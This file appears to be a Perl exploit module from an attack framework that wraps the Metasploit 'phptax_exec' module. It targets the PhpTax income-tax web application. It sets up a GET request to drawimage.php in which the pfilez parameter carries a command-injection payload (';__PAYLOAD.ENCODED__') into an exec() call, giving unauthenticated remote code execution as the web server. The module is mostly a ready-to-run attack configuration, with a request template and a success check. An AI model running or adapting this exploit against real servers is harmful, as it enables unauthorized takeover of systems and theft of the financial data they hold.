package PHPTAX::MSF::PhptaxExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "PhptaxExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits a vulnerability found in PhpTax, an income tax report

        generator.  When generating a PDF, the icondrawpng() function in drawimage.php

        does not properly handle the pfilez parameter, which will be used in an exec()

        statement, and then results in arbitrary remote code execution under the context

        of the web server.  Please note: authentication is not required to exploit this

        vulnerability.

      ",
  METHOD => "GET",
  MSF_MODULE => "phptax_exec",
  OSVDB => 86992,
  PATH => "pdf=make&pfilez=xxx;__PAYLOAD\\.ENCODED__&",
  PATHS => ["phptax/"],
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The path to the web application",
  VALUE => "/phptax/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
